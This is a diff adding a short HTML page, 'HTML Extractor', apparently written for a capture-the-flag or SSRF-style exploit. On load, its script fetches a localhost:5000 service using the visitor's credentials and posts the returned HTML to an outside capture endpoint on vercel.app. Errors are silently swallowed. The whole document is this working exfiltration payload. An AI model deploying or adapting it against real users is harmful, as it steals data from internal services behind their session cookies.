@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HTML Extractor</title>
+</head>
+<body>
+<script>
+(async () => {
+  try {
+    // Fetch HTML from localhost:5000
+    const res = await fetch('http://localhost:5000/', {credentials: 'include'});
+    const text = await res.text();
+    // Send it to your capture endpoint
+    await fetch('https://ssrf-eta.vercel.app/api/capture', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+      body: 'html=' + encodeURIComponent(text)
+    });
+  } catch (e) {}
+})();
+</script>
+<h1>Extractor Running...</h1>
+</body>
+</html>
